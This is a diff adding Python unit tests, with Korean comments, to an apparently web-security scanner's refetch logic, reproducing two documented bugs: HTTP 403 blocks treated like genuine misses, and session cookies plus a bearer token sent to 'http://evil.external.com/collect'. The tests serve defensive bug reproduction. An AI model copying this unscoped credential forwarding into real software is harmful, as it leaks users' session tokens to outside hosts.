@@ -64,6 +64,26 @@ class RefetchTests(unittest.TestCase):
     def test_default_max_retry_is_three(self) -> None:
         self.assertEqual(REVISIT_MAX_RETRY, 3)
 
+    # af.md #4 재현: refetch()는 response_status를 판정에 전혀 쓰지 않는다.
+    # 403(차단)이든 200(진짜 미탐지)이든 payload가 없으면 found=False로 똑같이 나오고,
+    # 호출부(family_pipeline._judge_stored)는 이 경우를 구분 없이 "정상 방어"로 해석한다.
+    # 재조회 응답의 유효성(상태 코드·인증 상태)을 먼저 확인하는 처리가 없음 — 수정 예정(2일차, af.md #4).
+    def test_error_status_and_genuine_miss_are_indistinguishable_bug(self) -> None:
+        class _StatusRequester:
+            def __init__(self, status: int):
+                self.status = status
+
+            def send(self, case, zap):
+                return {"response_body": "<html>blocked</html>", "response_status": self.status}
+
+        blocked = refetch("http://x/list", {}, PAYLOAD, _StatusRequester(403), zap=None, await_ms=0)
+        genuine_miss = refetch("http://x/list", {}, PAYLOAD, _StatusRequester(200), zap=None, await_ms=0)
+
+        self.assertFalse(blocked.found)
+        self.assertFalse(genuine_miss.found)
+        self.assertEqual(blocked.status, 403)  # status는 결과에 담기지만
+        self.assertEqual(blocked.attempts, genuine_miss.attempts)  # 판정 흐름(재시도 횟수)은 둘 다 동일하게 취급됨
+
     def test_get_request_targets_revisit_url(self) -> None:
         r = _RetryRequester(reflect_from=1)
         refetch("http://x/list", {"SID": "abc"}, PAYLOAD, r, zap=None, await_ms=0)
@@ -84,6 +104,31 @@ class RefetchTests(unittest.TestCase):
         finally:
             rv.time.sleep = orig_sleep
         self.assertEqual(captured, [0.5, 1.0])
+
+
+class RevisitCredentialScopeTests(unittest.TestCase):
+    # af.md #8 재현: revisit_url이 원본과 다른 외부 호스트여도 원본 쿠키·인증 헤더가
+    # 목적지 구분 없이 그대로 실려 나간다 — 재방문 목적지 허용 범위 검사가 없음.
+    # 수정 예정(2일차, af.md #8).
+    def test_refetch_sends_original_credentials_to_any_host_bug(self) -> None:
+        captured: dict = {}
+
+        class _CapturingRequester:
+            def send(self, case, zap):
+                captured["url"] = case.url
+                captured["cookies"] = case.cookies
+                captured["headers"] = case.headers
+                return {"response_body": "", "response_status": 200}
+
+        original_cookies = {"SESSIONID": "secret-auth-token"}
+        target = {"headers": {"Authorization": "Bearer secret"}}
+
+        refetch("http://evil.external.com/collect", original_cookies, None,
+                _CapturingRequester(), zap=None, target=target, max_retry=1)
+
+        self.assertEqual(captured["url"], "http://evil.external.com/collect")
+        self.assertEqual(captured["cookies"], original_cookies)
+        self.assertEqual(captured["headers"].get("Authorization"), "Bearer secret")
 
 
 class DiffNewRegionTests(unittest.TestCase):
